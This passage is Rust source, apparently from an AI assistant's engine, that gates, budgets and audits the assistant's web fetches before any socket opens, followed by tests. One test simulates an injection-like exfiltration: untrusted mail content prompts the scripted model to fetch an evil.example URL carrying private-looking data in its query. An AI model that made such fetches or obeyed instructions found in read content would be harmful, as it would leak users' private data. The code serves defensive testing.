//! The web egress layer: the deterministic gate, the per-turn and
//! per-day budget, and the `web.fetch` audit rows. It decides before
//! any socket opens.

use super::tools::CallOutcome;
use super::ChatSession;
use aux_providers::ToolCall;
use kernel_broker::ToolClassExt;
use kernel_net::{EgressContext, EgressDecision, FetchEgress, WebFetchEvent};
use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex, PoisonError};
use std::time::Instant;

/// One target of a web-egress call, for its `web.fetch` audit row. It carries
/// the host and hashes, never the query/URL text.
pub(super) struct WebAttempt {
    host: String,
    /// Origin key (`scheme://host:port`). An origin that answered marks the
    /// origin as seen for the non-sensitive mode rules (`ask_once_per_site`,
    /// `smart`); a sensitive turn never consults it.
    pub(super) origin_key: String,
    query_sha256: Option<String>,
    mode: &'static str,
    tainted: bool,
    carries_private_data: bool,
    /// True only for a target the approval card actually covered.
    asked: bool,
}

/// What the engine's web egress layer decided about one tool call.
pub(super) enum WebPrep {
    /// Not a web-egress tool (no [`kernel_broker::Tool::performs_web_egress`]).
    NotWeb,
    /// The gate refused it (or the budget bound): the call never runs. Its
    /// `web.fetch` row was already written by [`ChatSession::prepare_web_fetch`].
    Denied { outcome: CallOutcome },
    /// The gate passed. `ask_detail` forces a card through the broker even
    /// when an `allow` rule would otherwise run the fetch silently; it is the
    /// copy carried on the forced taint (the card's provenance line). The
    /// turn's ask-rule facts (`context`) ride along so the fetcher re-runs
    /// the same rule on every redirect destination. `approved_origins` is the
    /// set of origins the fetcher may contact: the declared hosts and the URL
    /// argument's origin. A tool may declare several target hosts; one
    /// approval covers the call.
    Proceed {
        attempts: Vec<WebAttempt>,
        ask_detail: Option<WebAsk>,
        context: EgressContext,
        approved_origins: BTreeSet<String>,
    },
}

/// Card copy and whether a private-data-only policy ask is the sole reason.
pub(super) struct WebAsk {
    pub(super) detail: String,
    pub(super) sensitive_only: bool,
}

/// The copy carried on a forced web ask, shown on the approval card's
/// provenance line and written to the `tool.decision` audit row.
///
/// A sensitive-turn ask (taint or private owner data) is plain French and
/// names exactly what would leave the machine — the URL and its host — so the
/// owner can judge the request. Any other ask reason keeps its machine label.
pub(super) fn web_ask_detail(
    reason: kernel_net::AskReason,
    checked: &kernel_net::CheckedUrl,
) -> String {
    match reason {
        kernel_net::AskReason::SensitiveTurn => format!(
            "sensitive_turn — l'adresse {} (hôte : {}) va quitter votre Mac ; la conversation est sensible, donc tout accès web demande votre accord",
            checked.url, checked.host
        ),
        other => other.as_str().to_string(),
    }
}

/// The approval detail for a tool whose egress destinations are fixed by its
/// implementation rather than supplied as a URL argument. It names the hosts
/// and the exact text the tool sends (a place name, say), so the owner sees
/// what would leave the machine.
fn web_ask_detail_for_hosts(
    reason: kernel_net::AskReason,
    hosts: &str,
    query: Option<&str>,
) -> String {
    let sent = query
        .map(|text| format!(" ; texte envoyé : « {text} »"))
        .unwrap_or_default();
    match reason {
        kernel_net::AskReason::SensitiveTurn => format!(
            "sensitive_turn — l'appel web va contacter les hôtes déclarés {hosts}{sent} ; la conversation est sensible, donc tout accès web demande votre accord"
        ),
        other => format!("{} — hôtes de destination déclarés : {hosts}{sent}", other.as_str()),
    }
}

/// A declared egress host is a bare DNS name: letters, digits, `-` and `.`.
/// Userinfo, a path, a port, a query or whitespace is refused, never repaired.
fn is_declared_host(host: &str) -> bool {
    !host.is_empty()
        && host.len() <= 253
        && host
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-' || byte == b'.')
}

/// A call the engine refused before it ran: the model is told why, never the
/// target or the query text.
fn refused(content: &str) -> WebPrep {
    WebPrep::Denied {
        outcome: CallOutcome {
            content: content.to_string(),
            status: "denied",
            taint: None,
            error_kind: None,
        },
    }
}

/// The `web.fetch` verdict of a target after the owner's decision: a target
/// the card covered is "ask:denied", any other is "denied".
pub(super) fn denied_verdict(asked: bool) -> &'static str {
    if asked {
        "ask:denied"
    } else {
        "denied"
    }
}

impl<'a> ChatSession<'a> {
    /// Build the per-fetch egress authority for one decided web call.
    ///
    /// Shared by the original decision and the re-decision an edited draft
    /// gets: both must run under the same turn facts, approved origins, seen
    /// set and budget, so a redirect or a substituted URL cannot ride a stale
    /// context.
    pub(super) fn egress_for(
        &self,
        context: EgressContext,
        approved_origins: BTreeSet<String>,
    ) -> FetchEgress {
        FetchEgress {
            context,
            seen_origins: Arc::new(self.web_seen_origins.clone()),
            approved_origins: Arc::new(approved_origins),
            budget: Arc::clone(&self.web_budget),
            refused_hops: Arc::new(Mutex::new(Vec::new())),
            received_response: Arc::new(Mutex::new(false)),
            received_origins: Arc::new(Mutex::new(BTreeMap::new())),
        }
    }

    /// Decide the engine's W1 web egress layer for one call, before the tool
    /// runs.
    ///
    /// Every target the call can contact goes through the same deterministic
    /// gate, budget check and mode/private-data decision: the URL argument when
    /// there is one, and every declared host. A tool with neither refuses the
    /// call. A declared host is a bare DNS name and nothing else. Nothing is
    /// reserved here: each destination reserves its budget when it connects, so
    /// a refused or unapproved call consumes nothing.
    pub(super) fn prepare_web_fetch(&mut self, call: &ToolCall) -> WebPrep {
        let registry_handle = Arc::clone(&self.registry);
        let registry = registry_handle
            .read()
            .unwrap_or_else(PoisonError::into_inner);
        let Some(tool) = registry.get(&call.name) else {
            return WebPrep::NotWeb;
        };
        if !tool.performs_web_egress() {
            return WebPrep::NotWeb;
        }
        let url = call.arguments.get("url").and_then(|value| value.as_str());
        if url.is_none() && tool.egress_url_argument() {
            // The tool checks its own `url` argument and refuses a missing or
            // non-string one before any socket opens. Leave that call to it.
            return WebPrep::NotWeb;
        }
        let declared = tool.egress_hosts(&call.arguments);
        if url.is_none() && declared.is_empty() {
            let row = self.web_attempt("(undeclared)".to_string(), String::new(), None, false);
            self.refuse_web_call(&[row], Some(0), "deny:missing_egress_hosts");
            return refused("denied: egress tool has no URL or declared hosts");
        }
        // The text a declared-host call sends (a place name, say) is hashed for
        // the audit row and shown on the card. It is the tool's own text.
        let query = tool.egress_query(&call.arguments);
        let query_hash = query.as_deref().map(|text| self.web.text_sha256(text));

        // The targets: the URL argument first, then each declared host once.
        // `(label, check, declared)`: `check` is the URL to gate, or `None` for
        // a declared host that is not a bare DNS name.
        let mut targets: Vec<(String, Option<String>, bool)> = Vec::new();
        if let Some(url) = url {
            let label = self
                .web
                .host_of(url)
                .unwrap_or_else(|| "(unparsed)".to_string());
            targets.push((label, Some(url.to_string()), false));
        }
        let mut seen_hosts = BTreeSet::new();
        for raw in declared {
            if !is_declared_host(raw) {
                targets.push(("(invalid)".to_string(), None, true));
            } else {
                let host = raw.to_ascii_lowercase();
                if seen_hosts.insert(host.clone()) {
                    let check = format!("https://{host}/");
                    targets.push((host, Some(check), true));
                }
            }
        }
        // One row per target, whatever happens to the call. A refusal names the
        // target it refused and the rows of the targets it never reached.
        let unchecked_rows: Vec<WebAttempt> = targets
            .iter()
            .map(|(label, _, declared)| {
                let query_sha256 = query_hash.clone().filter(|_| *declared);
                self.web_attempt(label.clone(), String::new(), query_sha256, false)
            })
            .collect();

        let mut checked_targets: Vec<kernel_net::CheckedUrl> = Vec::with_capacity(targets.len());
        let mut checked_declared: Vec<bool> = Vec::with_capacity(targets.len());
        for (index, (_, check, declared)) in targets.iter().enumerate() {
            let input = match check {
                Some(input) => input,
                None => {
                    self.refuse_web_call(&unchecked_rows, Some(index), "deny:invalid_egress_host");
                    return refused("denied: invalid declared egress host");
                }
            };
            match self.web.check(input) {
                Ok(checked) => {
                    checked_targets.push(checked);
                    checked_declared.push(*declared);
                }
                Err(reason) => {
                    let outcome = format!("deny:{}", reason.as_str());
                    self.refuse_web_call(&unchecked_rows, Some(index), &outcome);
                    return refused(&format!(
                        "denied: fetch refused by the web egress policy ({reason})"
                    ));
                }
            }
        }
        if checked_targets.is_empty() {
            return refused("denied: egress tool has no valid targets");
        }

        // Budget: every target must fit the per-turn, per-day and per-host
        // counters, or none of them runs. Nothing is reserved here.
        let hosts: Vec<&str> = checked_targets
            .iter()
            .map(|checked| checked.host.as_str())
            .collect();
        let budget_check = {
            let budget = match self.web_budget.lock() {
                Ok(budget) => budget,
                Err(poisoned) => poisoned.into_inner(),
            };
            budget.check(&hosts, Instant::now(), self.web.config())
        };
        if let Err(kind) = budget_check {
            let rows =
                self.checked_attempts(&checked_targets, &checked_declared, &query_hash, None);
            let outcome = format!("deny:{}", kind.deny_reason().as_str());
            self.refuse_web_call(&rows, None, &outcome);
            return refused("denied: web fetch budget exhausted");
        }

        let contexts: Vec<EgressContext> = checked_targets
            .iter()
            .map(|checked| EgressContext {
                tainted: self.taint.forces_ask(),
                carries_private_data: self.carries_private_data,
                seen_origin: self.web_seen_origins.contains(&checked.origin_key()),
            })
            .collect();
        let decisions: Vec<EgressDecision> = checked_targets
            .iter()
            .zip(&contexts)
            .map(|(checked, context)| self.web.decide_checked(checked, context))
            .collect();
        if let Some((index, reason)) =
            decisions
                .iter()
                .enumerate()
                .find_map(|(index, decision)| match decision {
                    EgressDecision::Deny(reason) => Some((index, *reason)),
                    _ => None,
                })
        {
            let rows =
                self.checked_attempts(&checked_targets, &checked_declared, &query_hash, None);
            let outcome = format!("deny:{}", reason.as_str());
            self.refuse_web_call(&rows, Some(index), &outcome);
            return refused(&format!(
                "denied: fetch refused by the web egress policy ({reason})"
            ));
        }

        // Only a target whose own decision asked is stamped as asked.
        let asked: Vec<bool> = decisions
            .iter()
            .map(|decision| matches!(decision, EgressDecision::Ask(_)))
            .collect();
        let attempts = self.checked_attempts(
            &checked_targets,
            &checked_declared,
            &query_hash,
            Some(&asked),
        );
        let ask_detail = decisions
            .iter()
            .find_map(|decision| match decision {
                EgressDecision::Ask(reason) => Some(*reason),
                _ => None,
            })
            .map(|reason| {
                let detail = if declared.is_empty() {
                    let checked = checked_targets
                        .iter()
                        .zip(&asked)
                        .find_map(|(checked, asked)| asked.then_some(checked))
                        .expect("an ask decision has an asked target");
                    web_ask_detail(reason, checked)
                } else {
                    let hosts = checked_targets
                        .iter()
                        .map(|checked| checked.host.as_str())
                        .collect::<Vec<_>>()
                        .join(", ");
                    web_ask_detail_for_hosts(reason, &hosts, query.as_deref())
                };
                // The sensitive rule runs before the owner's web mode. Check
                // that mode independently, so a private turn cannot waive it.
                let sensitive_only = reason == kernel_net::AskReason::SensitiveTurn
                    && checked_targets
                        .iter()
                        .zip(&contexts)
                        .all(|(checked, context)| {
                            let clean = EgressContext {
                                tainted: false,
                                carries_private_data: false,
                                ..*context
                            };
                            matches!(
                                self.web.decide_checked(checked, &clean),
                                EgressDecision::Allow
                            )
                        });
                WebAsk {
                    detail,
                    sensitive_only,
                }
            });
        WebPrep::Proceed {
            attempts,
            ask_detail,
            context: contexts[0],
            approved_origins: checked_targets
                .iter()
                .map(kernel_net::CheckedUrl::origin_key)
                .collect(),
        }
    }

    /// The audit rows for checked targets. `asked` (when given) stamps each
    /// target with its own decision; `None` marks every target as not asked.
    fn checked_attempts(
        &self,
        checked: &[kernel_net::CheckedUrl],
        declared: &[bool],
        query_hash: &Option<String>,
        asked: Option<&[bool]>,
    ) -> Vec<WebAttempt> {
        checked
            .iter()
            .enumerate()
            .map(|(index, checked)| {
                let is_declared = declared.get(index).copied().unwrap_or(false);
                let query_sha256 = if is_declared {
                    query_hash.clone()
                } else {
                    self.web.query_sha256(&checked.url)
                };
                let asked = asked.is_some_and(|asked| asked.get(index).copied().unwrap_or(false));
                self.web_attempt(
                    checked.host.clone(),
                    checked.origin_key(),
                    query_sha256,
                    asked,
                )
            })
            .collect()
    }

    /// One audit target. `origin_key` is empty for a target never checked.
    fn web_attempt(
        &self,
        host: String,
        origin_key: String,
        query_sha256: Option<String>,
        asked: bool,
    ) -> WebAttempt {
        WebAttempt {
            host,
            origin_key,
            query_sha256,
            mode: self.web.mode_label(),
            tainted: self.taint.forces_ask(),
            carries_private_data: self.carries_private_data,
            asked,
        }
    }

    /// Write one `web.fetch` row per target of a refused call. The target that
    /// was refused gets `outcome`; the targets the refusal never reached are
    /// rolled back. A call refused as a whole (`offending` = `None`) gives every
    /// target `outcome`. Targets that were never contacted say so.
    fn refuse_web_call(&self, rows: &[WebAttempt], offending: Option<usize>, outcome: &str) {
        for (index, row) in rows.iter().enumerate() {
            let (status, verdict) = match offending {
                Some(refused) if refused == index => ("refused", outcome),
                Some(_) => ("not contacted", "rolled_back"),
                None => ("not contacted", outcome),
            };
            self.emit_web_fetch(row, 0, status, verdict);
        }
    }

    /// Write one `web.fetch` row per target of a call that did, or was meant
    /// to, reach the network. A target whose origin answered carries the bytes
    /// that origin sent and its status: `answered_ok` for a 2xx answer, "failed"
    /// otherwise. Every other target is "not contacted" with 0 bytes.
    pub(super) fn emit_call_rows(
        &self,
        attempts: &[WebAttempt],
        egress: Option<&FetchEgress>,
        answered_ok: &str,
        verdict: fn(bool) -> &'static str,
    ) {
        for attempt in attempts {
            let receipt = egress.and_then(|facts| facts.origin_receipt(&attempt.origin_key));
            let (status, bytes) = match receipt {
                Some(receipt) if (200..300).contains(&receipt.http_status) => {
                    (answered_ok, receipt.bytes)
                }
                Some(receipt) => ("failed", receipt.bytes),
                None => ("not contacted", 0),
            };
            self.emit_web_fetch(attempt, bytes, status, verdict(attempt.asked));
        }
    }

    /// Write one `web.fetch` audit row: host + hashes, never the query/URL.
    fn emit_web_fetch(&self, attempt: &WebAttempt, bytes: usize, status: &str, outcome: &str) {
        let event = WebFetchEvent {
            host: attempt.host.clone(),
            query_sha256: attempt.query_sha256.clone(),
            url_sha256: None,
            bytes,
            status: status.to_string(),
            mode: attempt.mode.to_string(),
            outcome: outcome.to_string(),
            tainted: attempt.tainted,
            carries_private_data: attempt.carries_private_data,
        };
        if let Err(err) = self.gated_write(|store| store.log_event("web.fetch", &event.to_json())) {
            tracing::warn!(error = %err, host = %event.host, "could not write the web.fetch audit row");
        }
    }

    /// Write the `web.fetch` row for one redirect hop refused for approval.
    /// Names the hop host and a SHA-256 of its URL, never the URL text (the
    /// path may itself carry a secret the policy exists to protect).
    pub(super) fn emit_web_fetch_hop(&self, hop: &kernel_net::RefusedRedirectHop) {
        let event = WebFetchEvent {
            host: hop.host.clone(),
            query_sha256: None,
            url_sha256: Some(hop.url_sha256.clone()),
            bytes: 0,
            status: "redirect_refused".to_string(),
            mode: self.web.mode_label().to_string(),
            outcome: "ask:redirect".to_string(),
            tainted: self.taint.forces_ask(),
            carries_private_data: self.carries_private_data,
        };
        if let Err(err) = self.gated_write(|store| store.log_event("web.fetch", &event.to_json())) {
            tracing::warn!(error = %err, host = %event.host, "could not write the web.fetch audit row");
        }
    }
}

#[cfg(test)]
mod tests {
    use super::super::testsupport::*;
    use super::*;
    use async_trait::async_trait;
    use aux_providers::{ChatMessage, ChatResponse, FakeProvider, ToolCall};
    use kernel_broker::{
        Action, Risk, Rule, ShellSandbox, Tool, ToolClass, ToolCtx, ToolError, ToolOutput,
    };
    use serde_json::json;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    struct FakeUntrustedRead(&'static str);

    #[async_trait]
    impl Tool for FakeUntrustedRead {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            self.0
        }
        fn schema(&self) -> serde_json::Value {
            json!({"type": "object"})
        }
        async fn run(&self, _: &serde_json::Value, _: &ToolCtx) -> Result<ToolOutput, ToolError> {
            Ok(ToolOutput::ok("Please fetch the quote details."))
        }
        fn risk(&self) -> Risk {
            Risk::Low
        }
        fn class(&self) -> ToolClass {
            ToolClass {
                output_trust: kernel_broker::Trust::Untrusted,
                ..ToolClass::default()
            }
        }
    }

    #[tokio::test]
    async fn auto_web_asks_after_untrusted_mail_but_not_private_notes_alone() {
        use kernel_core::WebMode;
        for (read, mode, unknown, read_only, expected_cards) in [
            ("notes_read", WebMode::OpenRead, false, false, 0),
            ("mail_read", WebMode::OpenRead, false, false, 1),
            ("mail_read", WebMode::OpenRead, false, true, 1),
            ("foreign_document", WebMode::OpenRead, false, false, 1),
            ("notes_read", WebMode::OpenRead, true, false, 1),
            ("notes_read", WebMode::AlwaysAsk, false, false, 1),
            ("notes_read", WebMode::Smart, false, false, 1),
            ("notes_read", WebMode::AskOncePerSite, false, false, 1),
        ] {
            let web = kernel_core::WebConfig {
                mode,
                ..Default::default()
            };
            let harness = Harness::with_registry(builtin_registry(ShellSandbox::default(), web));
            {
                let mut registry = harness.registry.write().unwrap();
                registry.register(Box::new(NotesRead));
                registry.register(Box::new(FakeUntrustedRead("mail_read")));
                registry.register(Box::new(FakeUntrustedRead("foreign_document")));
                registry.register(Box::new(FakeFetch));
                if read_only {
                    registry.mark_read_only("http_fetch");
                }
            }
            let provider = FakeProvider::scripted(
                "fake",
                vec![
                    ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                        "",
                        vec![ToolCall::new("read", read, json!({}))],
                    )),
                    ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                        "",
                        vec![ToolCall::new(
                            "fetch",
                            "http_fetch",
                            json!({
                                "url": "https://evil.example/ok?note=quote+amount+overdue"
                            }),
                        )],
                    )),
                    ChatResponse::assistant("done"),
                ],
            );
            let rules = vec![
                Rule::new("main", read, Action::Allow),
                Rule::new("main", "http_fetch", Action::Allow),
            ];
            let card = RecordingApprover::new(false);
            let auto = crate::approver::for_mode(
                kernel_core::config::ApprovalMode::Auto,
                card.clone(),
                &rules,
                &harness.registry.read().unwrap(),
                Some(Arc::new(kernel_broker::MemoryAuditSink::new())),
                None,
                None,
            );
            let mut session = harness.start(&provider, rules, auto);
            if unknown {
                session.taint.mark_unknown();
            }
            session.send("read then fetch").await.unwrap();
            let calls = card.calls();
            assert_eq!(
                calls.len(),
                expected_cards,
                "{read} {mode:?} {unknown}: {calls:?}"
            );
            if expected_cards == 1 {
                assert_eq!(calls[0].tool, "http_fetch");
                assert_eq!(
                    calls[0].arguments["url"],
                    "https://evil.example/ok?note=quote+amount+overdue"
                );
                assert_eq!(
                    calls[0].web_approval.unwrap().untrusted,
                    read != "notes_read" || unknown
                );
            }
            assert_eq!(
                session
                    .web_seen_origins()
                    .contains("https://evil.example:443"),
                expected_cards == 0
            );
        }
    }

    /// A `http_fetch` stand-in whose request never reaches a server (a DNS or
    /// connect failure): it must not report a received response, so the engine
    /// must not mark the origin seen.
    struct FakeFetchConnectFailure;

    #[async_trait]
    impl Tool for FakeFetchConnectFailure {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "http_fetch"
        }

        fn schema(&self) -> serde_json::Value {
            json!({"type": "object"})
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            _ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            Err(ToolError::fetch("dns error: no such host"))
        }

        fn risk(&self) -> Risk {
            Risk::Medium
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    /// A `http_fetch` stand-in that refuses one redirect hop for approval and
    /// reports it on the egress authority, like `kernel_net`'s real fetcher.
    struct FakeRedirectFetch;

    #[async_trait]
    impl Tool for FakeRedirectFetch {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "http_fetch"
        }

        fn schema(&self) -> serde_json::Value {
            json!({"type": "object"})
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            if let Some(egress) = &ctx.egress {
                egress.note_refused_hop("https://hop.example/log/GRID-SECRET-44000");
            }
            Ok(ToolOutput::error(
                "the redirect needs its own approval and was not followed",
            ))
        }

        fn risk(&self) -> Risk {
            Risk::Medium
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    /// Sensitive-turn card copy keeps its policy label for the owner.
    #[test]
    fn a_sensitive_turn_web_ask_opens_with_the_policy_prefix() {
        let prefix = "web: sensitive_turn";
        assert!(sensitive_web_ask("https://example.com/a").starts_with(prefix));
        let reason = kernel_net::AskReason::SensitiveTurn;
        let hosts = web_ask_detail_for_hosts(reason, "api.example.com", None);
        assert!(format!("web: {hosts}").starts_with(prefix));
        let other = web_ask_detail_for_hosts(kernel_net::AskReason::ModeAlwaysAsk, "a.b", None);
        assert!(!format!("web: {other}").starts_with(prefix));
    }

    #[tokio::test]
    async fn a_no_url_egress_tool_is_checked_against_its_declared_hosts() {
        let web = kernel_core::WebConfig {
            deny_domains: vec!["blocked.example".to_string()],
            ..kernel_core::WebConfig::default()
        };
        let mut registry = builtin_registry(ShellSandbox::default(), web);
        let ran = Arc::new(AtomicBool::new(false));
        registry.register(Box::new(NoUrlEgress {
            hosts: &["blocked.example"],
            ran: Arc::clone(&ran),
        }));
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "connector_no_url", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(&provider, vec![], approver.clone());

        session.send("call the connector").await.unwrap();

        assert!(!ran.load(Ordering::SeqCst), "deny_domains stops the tool");
        assert!(approver.calls().is_empty(), "deny_domains never asks");
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 1);
    }

    #[tokio::test]
    async fn a_no_url_egress_tool_reserves_every_declared_host_from_the_budget() {
        let web = kernel_core::WebConfig {
            fetches_per_turn: 1,
            ..kernel_core::WebConfig::default()
        };
        let mut registry = builtin_registry(ShellSandbox::default(), web);
        let ran = Arc::new(AtomicBool::new(false));
        registry.register(Box::new(NoUrlEgress {
            hosts: &["first.example", "second.example"],
            ran: Arc::clone(&ran),
        }));
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "connector_no_url", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(&provider, vec![], approver.clone());

        session.send("call the connector").await.unwrap();

        assert!(
            !ran.load(Ordering::SeqCst),
            "the second target exceeds the budget"
        );
        assert!(approver.calls().is_empty(), "a budget denial never asks");
        // One row per declared target: the refusal and the sibling it rolled back.
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 2);
    }

    #[tokio::test]
    async fn an_egress_tool_without_url_or_hosts_is_refused() {
        let harness = Harness::new();
        let ran = Arc::new(AtomicBool::new(false));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NoUrlEgress {
                hosts: &[],
                ran: Arc::clone(&ran),
            }));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "connector_no_url", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(&provider, vec![], approver.clone());

        session.send("call the connector").await.unwrap();

        assert!(!ran.load(Ordering::SeqCst), "missing hosts fail closed");
        assert!(approver.calls().is_empty(), "there is no target to approve");
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 1);
        assert!(
            !session.taint().forces_ask(),
            "refusing an undeclared egress tool does not taint the conversation"
        );
    }

    #[cfg(feature = "l1-fetch")]
    /// A declared-host tool that fetches an origin it never declared. The
    /// fetcher must refuse it before DNS; the tool records what it saw.
    struct FetchesUndeclared {
        refused: Arc<AtomicBool>,
    }

    #[cfg(feature = "l1-fetch")]
    #[async_trait]
    impl Tool for FetchesUndeclared {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "fetches_undeclared"
        }

        fn schema(&self) -> serde_json::Value {
            json!({ "type": "object" })
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            let Some(egress) = ctx.egress.as_ref() else {
                return Ok(ToolOutput::error("no egress authority"));
            };
            let fetched = aux_runtime::fetch::Fetcher::new()
                .fetch_with_egress(
                    "https://other.example/page",
                    kernel_net::RenderMode::Simple,
                    egress,
                )
                .await;
            if matches!(
                fetched,
                Err(kernel_net::FetchError::PolicyRefused(
                    kernel_net::DenyReason::OriginNotApproved
                ))
            ) {
                self.refused.store(true, Ordering::SeqCst);
            }
            Ok(ToolOutput::ok("done"))
        }

        fn risk(&self) -> Risk {
            Risk::Low
        }

        fn egress_hosts(&self, _arguments: &serde_json::Value) -> &'static [&'static str] {
            &["declared.example"]
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    #[cfg(feature = "l1-fetch")]
    #[tokio::test]
    async fn a_declared_host_tool_cannot_fetch_an_undeclared_origin() {
        let harness = Harness::new();
        let refused = Arc::new(AtomicBool::new(false));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FetchesUndeclared {
                refused: Arc::clone(&refused),
            }));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "fetches_undeclared", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let mut session = harness.start(&provider, vec![], RecordingApprover::new(true));

        session.send("run the tool").await.unwrap();

        assert!(
            refused.load(Ordering::SeqCst),
            "an origin the call was not approved for is refused before DNS"
        );
    }

    /// A tool with a URL argument and declared hosts. Both are gated.
    struct UrlAndDeclared {
        ran: Arc<AtomicBool>,
    }

    #[async_trait]
    impl Tool for UrlAndDeclared {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "url_and_declared"
        }

        fn schema(&self) -> serde_json::Value {
            json!({ "type": "object" })
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            _ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            self.ran.store(true, Ordering::SeqCst);
            Ok(ToolOutput::ok("done"))
        }

        fn risk(&self) -> Risk {
            Risk::Low
        }

        fn egress_hosts(&self, _arguments: &serde_json::Value) -> &'static [&'static str] {
            &["declared.example"]
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    #[tokio::test]
    async fn a_url_argument_and_declared_hosts_are_both_gated() {
        let web = kernel_core::WebConfig {
            deny_domains: vec!["url.example".to_string()],
            ..kernel_core::WebConfig::default()
        };
        let mut registry = builtin_registry(ShellSandbox::default(), web);
        let ran = Arc::new(AtomicBool::new(false));
        registry.register(Box::new(UrlAndDeclared {
            ran: Arc::clone(&ran),
        }));
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "url_and_declared",
                        json!({ "url": "https://url.example/page" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(&provider, vec![], approver.clone());

        session.send("call the tool").await.unwrap();

        assert!(!ran.load(Ordering::SeqCst), "the URL half is denied");
        assert!(approver.calls().is_empty(), "a policy denial never asks");
        // The refused URL and the declared host it rolled back, one row each.
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 2);
    }

    /// A declared-host tool whose card and audit row must name the text it
    /// sends: a validated place name.
    struct PlaceLookup;

    #[async_trait]
    impl Tool for PlaceLookup {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "place_lookup"
        }

        fn schema(&self) -> serde_json::Value {
            json!({ "type": "object" })
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            _ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            Ok(ToolOutput::ok("done"))
        }

        fn risk(&self) -> Risk {
            Risk::Low
        }

        fn egress_hosts(&self, _arguments: &serde_json::Value) -> &'static [&'static str] {
            &["api.example"]
        }

        fn egress_query(&self, _arguments: &serde_json::Value) -> Option<String> {
            Some("Paris".to_string())
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    #[tokio::test]
    async fn a_declared_host_card_names_the_outbound_text_and_the_row_hashes_it() {
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NotesRead));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(PlaceLookup));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "notes_read", json!({}))],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_2", "place_lookup", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = ApproveNotesOnly::new();
        let mut session = harness.start(&provider, vec![], approver.clone());

        session
            .send("read my notes, then look up the place")
            .await
            .unwrap();

        let lookup = approver
            .calls()
            .into_iter()
            .find(|request| request.tool == "place_lookup")
            .expect("a sensitive turn asks for a declared-host call");
        let detail = lookup.taint_source.expect("the card names its targets");
        assert!(detail.contains("« Paris »"), "{detail}");
        assert!(detail.contains("api.example"), "{detail}");
        let rows = harness.store().event_payloads("web.fetch").unwrap();
        assert_eq!(rows.len(), 1);
        let row: serde_json::Value = serde_json::from_str(&rows[0]).unwrap();
        assert_eq!(row["host"], json!("api.example"));
        assert_eq!(
